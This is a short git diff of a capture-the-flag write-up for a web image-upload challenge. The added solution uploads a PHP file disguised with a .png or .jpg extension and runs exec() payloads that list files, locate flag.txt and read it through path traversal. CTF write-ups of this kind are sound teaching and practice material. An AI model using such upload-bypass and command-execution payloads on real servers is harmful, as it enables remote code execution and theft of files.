@@ -11,7 +11,20 @@
 - N/A
 
 ### Analysis
-The website has an image upload but does not allow
+The website has an image upload but checks for the .php extension
 
 ### Solution
-1. 
+1. Similar to [Superior File Manager](https://github.com/mynamegabe/May-CTF-Writeups/edit/main/Web/Superior-File-Manager), Upload a PHP script with a .png or .jpg extension
+   ```php
+   <?php echo exec("ls -la"); ?>
+   ```
+2. View the file after uploading
+   The PHP file will be executed.
+3. Accessing the flag
+   ```php
+   <?php echo exec("locate flag.txt"); ?>
+   ```
+4. Getting the flag
+   ```php
+   <?php echo exec("cat ../../../../../flag.txt"); ?>
+   ```
